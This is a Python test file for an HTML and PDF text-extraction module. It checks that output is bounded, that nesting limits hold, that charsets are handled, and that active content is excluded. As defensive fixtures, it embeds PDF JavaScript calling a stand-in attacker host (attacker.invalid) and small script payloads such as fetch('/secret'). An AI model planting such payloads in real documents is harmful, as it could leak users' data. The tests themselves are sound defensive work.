from io import BytesIO

import pytest
from pypdf import PdfWriter
from pypdf.generic import DecodedStreamObject, DictionaryObject, NameObject

from src.extraction import MAX_HTML_DEPTH, ExtractionFailed, extract_html, extract_pdf


def _pdf(
    *page_texts: str,
    title: str | None = None,
    hostile_objects: bool = False,
    compressed: bool = False,
) -> bytes:
    writer = PdfWriter()
    font = DictionaryObject(
        {
            NameObject("/Type"): NameObject("/Font"),
            NameObject("/Subtype"): NameObject("/Type1"),
            NameObject("/BaseFont"): NameObject("/Helvetica"),
        }
    )
    font_ref = writer._add_object(font)  # noqa: SLF001 - generated test fixture
    for text in page_texts:
        page = writer.add_blank_page(width=612, height=792)
        page[NameObject("/Resources")] = DictionaryObject(
            {NameObject("/Font"): DictionaryObject({NameObject("/F1"): font_ref})}
        )
        if text:
            escaped = text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            stream = DecodedStreamObject()
            stream.set_data(f"BT /F1 12 Tf 72 720 Td ({escaped}) Tj ET".encode())
            if compressed:
                stream = stream.flate_encode()
            page[NameObject("/Contents")] = writer._add_object(stream)  # noqa: SLF001
    if title is not None:
        writer.add_metadata({"/Title": title})
    if hostile_objects:
        writer.add_js("app.launchURL('https://attacker.invalid/secret')")
        writer.add_attachment("private.txt", b"embedded private material")
    output = BytesIO()
    writer.write(output)
    return output.getvalue()


def test_html_is_data_not_active_content() -> None:
    result = extract_html(
        b"""
        <html><head><title>Quarterly report</title><style>.x{display:none}</style></head>
        <body><p>Hello <b>world</b></p><script>fetch('/secret')</script>
        <template>hidden template</template><iframe>hidden frame</iframe>
        <object>hidden object</object></body></html>
        """
    )

    assert result.title == "Quarterly report"
    assert result.text == "Hello world"
    assert result.truncated is False
    assert result.page_count is None


def test_html_visible_text_is_bounded_and_marks_truncation() -> None:
    result = extract_html(("<p>" + "x" * 50001 + "</p>").encode(), max_chars=50000)

    assert result.text == "x" * 50000
    assert result.truncated is True


def test_excessive_html_nesting_is_unsupported() -> None:
    document = ("<div>" * 257 + "text" + "</div>" * 257).encode()

    with pytest.raises(ExtractionFailed, match="unsupported_document"):
        extract_html(document)


def test_sequential_void_html_elements_do_not_count_as_nesting() -> None:
    result = extract_html(("<br>" * 300 + "visible").encode())

    assert result.text == "visible"


def test_pdf_text_pages_and_metadata_are_bounded() -> None:
    document = _pdf(*(f"Page {index}" for index in range(1, 102)), title="Annual report")

    result = extract_pdf(document, max_pages=100)

    assert result.title == "Annual report"
    assert result.page_count == 101
    assert result.truncated is True
    assert "Page 1" in result.text
    assert "Page 100" in result.text
    assert "Page 101" not in result.text


def test_pdf_embedded_code_and_attachments_are_never_extracted() -> None:
    result = extract_pdf(_pdf("Visible report", hostile_objects=True))

    assert "Visible report" in result.text
    assert "launchURL" not in result.text
    assert "embedded private material" not in result.text


def test_pdf_extracted_text_is_bounded_and_marks_truncation() -> None:
    result = extract_pdf(_pdf("x" * 60000), max_chars=50000)

    assert len(result.text) == 50000
    assert result.truncated is True


def test_compressed_pdf_cannot_expand_past_text_limit() -> None:
    document = _pdf("x" * 1_000_000, compressed=True)

    result = extract_pdf(document, max_chars=50000)

    assert len(document) < 10000
    assert len(result.text) == 50000
    assert result.truncated is True


@pytest.mark.parametrize("document", [b"not a pdf", _pdf("")])
def test_malformed_or_scanned_only_pdf_is_unsupported(document: bytes) -> None:
    with pytest.raises(ExtractionFailed, match="unsupported_document"):
        extract_pdf(document)


def test_body_survives_an_omitted_head_end_tag() -> None:
    """HTML5 lets a document omit </head>; dropping the body is not an option.

    `head` stayed on the parser stack forever, so handle_data returned early
    for every node and the whole page came back as unsupported_document.
    """
    with_body_tag = extract_html(b"<html><head><title>T</title><body><p>Hello world</p>")
    assert with_body_tag.text == "Hello world"
    assert with_body_tag.title == "T"

    # Flow content also implies </head>, even with no <body> tag at all.
    implied = extract_html(b"<html><head><title>T</title><p>Hello world</p>")
    assert implied.text == "Hello world"


@pytest.mark.parametrize(
    "markup",
    (
        b"<html><body><ul>" + b"<li>item" * 300 + b"</ul></body></html>",
        b"<html><body>" + b"<p>para" * 300 + b"</body></html>",
        b"<html><body><table><tr>" + b"<td>cell" * 300 + b"</table></body></html>",
    ),
)
def test_optional_end_tags_do_not_exhaust_the_depth_bound(markup: bytes) -> None:
    """These are two levels deep, not 300: the stack must unwind as it goes."""
    assert extract_html(markup).text


def test_depth_bound_still_rejects_genuinely_deep_nesting() -> None:
    """Auto-closing must not become a way to skip MAX_HTML_DEPTH."""
    deep = b"<html><body>" + b"<div>" * (MAX_HTML_DEPTH + 10) + b"x"
    with pytest.raises(ExtractionFailed) as failure:
        extract_html(deep)
    assert failure.value.code == "unsupported_document"


def test_blocked_tags_stay_blocked_inside_auto_closed_elements() -> None:
    """A blocked tag nested in an auto-closable one must still be excluded."""
    result = extract_html(
        b"<html><body><ul><li>keep<script>alert(1)</script><li>also</body></html>"
    )
    assert "alert" not in result.text
    assert result.text == "keep also"


def test_declared_charset_is_honoured_before_assuming_utf8() -> None:
    """Legacy encodings must not be persisted as a wall of U+FFFD.

    The Content-Type charset was discarded upstream and everything decoded as
    UTF-8, which turned cp1251 pages — common on the Russian-language web —
    into unreadable text that was still stored as a citable source.
    """
    # Cyrillic is the point of this test (cp1251 is a Cyrillic code page), so
    # the samples are escaped to keep the source itself English-only.
    title = "\u0417\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a"
    text = "\u041f\u0440\u0438\u0432\u0435\u0442 \u043c\u0438\u0440"
    page = f"<html><head><title>{title}</title></head><body><p>{text}</p></body></html>"

    from_header = extract_html(page.encode("cp1251"), charset="windows-1251")
    assert from_header.text == text
    assert from_header.title == title

    meta = (
        '<html><head><meta charset="windows-1251">'
        f"<title>{title}</title></head><body><p>{text}</p></body></html>"
    )
    assert extract_html(meta.encode("cp1251")).text == text


@pytest.mark.parametrize("charset", ("rot13", "base64", "zlib", "not a charset", "x" * 200))
def test_hostile_charset_falls_back_instead_of_reaching_a_text_codec(charset: str) -> None:
    """The charset is attacker-controlled and Python ships text-to-text codecs."""
    result = extract_html(b"<html><body><p>Hello</p></body></html>", charset=charset)
    assert result.text == "Hello"
